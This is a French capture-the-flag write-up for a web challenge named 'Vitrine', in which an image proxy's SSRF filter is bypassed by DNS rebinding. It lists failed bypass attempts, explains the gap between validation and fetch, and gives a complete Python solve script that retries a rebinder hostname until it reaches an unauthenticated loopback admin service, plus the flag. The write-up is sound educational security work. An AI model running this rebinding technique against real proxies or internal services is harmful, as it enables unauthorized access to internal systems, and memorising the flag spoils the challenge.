# Vitrine — Writeup

## Énoncé (HTL)

- **Titre :** Vitrine
- **Catégorie :** webex
- **Points :** 708
- **Solves :** 58
- **Connexion :** `http://web.ctf.yogosha.com:8008`

> Le site de l'établissement récupère ses illustrations depuis différentes sources,
> au gré des besoins de l'équipe de communication. Le proxy média récupère donc une
> image distante à la demande et renvoie directement son contenu.
> Un service d'administration des médias fonctionne parallèlement à celui-ci. Il ne
> dispose d'aucune authentification, car il est lié à l'interface loopback et
> l'équipe de communication était donc assurée qu'il était inaccessible.

## Protections / modèle

Pas de sources fournies : challenge en **boîte noire**. L'API (JSON) :

```json
{
  "endpoints": {
    "GET /thumb?url=<http(s) url>": "fetch a remote image for use on the site",
    "GET /healthz": "service and dependency status"
  },
  "policy": "remote sources must resolve to a publicly routable address"
}
```

`GET /healthz` révèle la cible interne :

```json
{ "ok": true, "media_admin": "127.0.0.1:8081",
  "media_admin_reachable_from": "loopback only",
  "fetch_timeout": 3.0, "max_bytes": 2097152 }
```

Le proxy `/thumb` est un **SSRF** potentiel, mais il applique un filtre : il
**résout le nom d'hôte** de l'URL et **refuse** toute adresse non routable. Les
tentatives directes échouent toutes :

| Entrée | Résultat |
|---|---|
| `http://127.0.0.1:8081/` | `non-routable address: 127.0.0.1` |
| `http://localhost/` | `non-routable address: 127.0.0.1, ::1` |
| `http://2130706433:8081/` (décimal) | résolu → `127.0.0.1` → refusé |
| `http://127.0.0.1.nip.io:8081/` | résolu → `127.0.0.1` → refusé |
| `http://[::ffff:127.0.0.1]:8081/` (IPv4-mapped) | refusé |
| via redirection HTTP (302 → 127.0.0.1) | `image source redirected, which is not allowed` |

Le filtre résout donc **toutes** les formes et interdit aussi les redirections.

## Vulnérabilité : SSRF par DNS rebinding (TOCTOU résolution/fetch)

Le contrôle de sécurité fait deux choses, à deux moments différents :

1. **validation** : il résout le nom d'hôte et vérifie que l'IP est publique ;
2. **fetch** : la bibliothèque HTTP **re-résout** le même nom pour ouvrir la
   connexion.

Entre ces deux résolutions, rien ne garantit la **même** réponse DNS. En utilisant
un nom d'hôte « rebinder » qui renvoie **aléatoirement** soit une IP publique soit
`127.0.0.1`, on peut tomber sur le cas gagnant :

- la **validation** résout vers l'IP **publique** → le filtre laisse passer ;
- le **fetch** résout vers **`127.0.0.1`** → la requête atteint le service admin
  loopback `127.0.0.1:8081`, qui n'a aucune authentification.

Le flag le dit lui-même : *résolu deux fois, validé une seule fois*.

On utilise `rbndr.us` : un nom de la forme `<hexIP1>.<hexIP2>.rbndr.us` renvoie au
hasard `IP1` ou `IP2` à chaque requête DNS.

- `7f000001` = `127.0.0.1`
- `01010101` = `1.1.1.1` (n'importe quelle IP publique)
- nom : `7f000001.01010101.rbndr.us`

Il reste à **réessayer** : à chaque appel, ~25 % de chances que validation=publique
et fetch=loopback (les autres cas : refusé si validation=loopback, ou timeout si
fetch=publique sur le port 8081).

## Résolution pas à pas

1. Repérer la cible interne via `/healthz` → `127.0.0.1:8081`, et son endpoint
   `/flag` (visible en listant `/` du service admin une fois le SSRF obtenu).

2. Construire l'URL rebinder pointant vers le service admin :

```python
rebinder = "7f000001.01010101.rbndr.us"     # 127.0.0.1 <-> 1.1.1.1 au hasard
target   = f"http://{rebinder}:8081/flag"
```

3. La passer au proxy, encodée :

```python
import urllib.parse
q = base + "/thumb?url=" + urllib.parse.quote(target, safe='')
```

4. Boucler jusqu'à ce que le hasard DNS joue en notre faveur :

```python
import urllib.request, re
for _ in range(200):
    try:
        body = urllib.request.urlopen(q, timeout=6).read().decode(errors="replace")
    except Exception:
        continue                 # refusé (loopback) ou timeout (IP publique)
    m = re.search(r"HTL\{[^}]*\}", body)
    if m:
        print(m.group(0)); break
```

## Script complet -> Script intégral

```python
#!/usr/bin/env python3
# Vitrine — SSRF par DNS rebinding. Le proxy valide l'URL en résolvant le nom
# (doit être public) PUIS re-résout au moment du fetch. Un nom "rebinder" qui
# alterne entre une IP publique et 127.0.0.1 passe la validation puis atteint le
# service admin loopback (127.0.0.1:8081).
# Usage: python3 solve.py <host> <port>        (def: web.ctf.yogosha.com 8008)
import sys, re, urllib.request, urllib.parse

host = sys.argv[1] if len(sys.argv) > 1 else "web.ctf.yogosha.com"
port = sys.argv[2] if len(sys.argv) > 2 else "8008"
base = f"http://{host}:{port}"

# rbndr.us : <hex IP1>.<hex IP2>.rbndr.us -> renvoie aléatoirement IP1 ou IP2.
# 7f000001 = 127.0.0.1 ; 01010101 = 1.1.1.1 (IP publique quelconque).
rebinder = "7f000001.01010101.rbndr.us"
target = f"http://{rebinder}:8081/flag"            # /flag du service admin interne
q = base + "/thumb?url=" + urllib.parse.quote(target, safe='')

for i in range(200):
    try:
        body = urllib.request.urlopen(q, timeout=6).read().decode(errors="replace")
    except Exception:
        continue                                   # bloqué (127.0.0.1) ou timeout (IP publique)
    m = re.search(r"HTL\{[^}]*\}", body)
    if m:
        print(f"[+] rebinding réussi (essai {i})")
        print("[+] Flag :", m.group(0)); break
else:
    print("[-] échec (rbndr.us indisponible ? réessayer, ou utiliser 1u.ms)")
```

> **Dépendance externe :** le script s'appuie sur le service public de DNS rebinding
> `rbndr.us` (aucun compte requis). S'il est indisponible, on peut utiliser `1u.ms`
> ou héberger son propre serveur DNS « rebinder ». Aucune autre dépendance : stdlib
> uniquement.

## Flag

```
HTL{r3s0lv3d_tw1c3_but_v4l1d4t3d_0nc3}
```

*(Challenge en boîte noire — résolu directement sur l'instance HTL. Sur ~60 essais,
~30 % atteignent le service loopback ; le reste est soit refusé (DNS = 127.0.0.1 à
la validation), soit en timeout (DNS = IP publique au fetch).)*
